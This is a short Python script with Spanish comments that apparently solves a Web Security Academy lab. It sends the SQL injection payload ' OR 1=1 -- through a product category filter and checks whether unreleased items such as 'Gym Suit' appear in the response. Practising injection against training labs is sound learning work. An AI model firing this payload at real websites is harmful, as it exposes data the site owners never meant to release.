import requests # Permite hacer la peticion GET

# Parámetros de entrada
url = "https://0a9d000b0422a15080a8db780055001b.web-security-academy.net"
sql = "' OR 1=1 --"

# Realizamos la petición GET
r = requests.get(url + '/filter?category=' + sql)

# Validamos si uno de los textos presentes 
# en la consulta exitosa existe en la respuesta GET
if "Gym Suit" in r.text:
    print("Se ha realizado la inyección SQL exitosamente")
else:
    print("No se pudo realizar la inyección SQL")

print(r.text)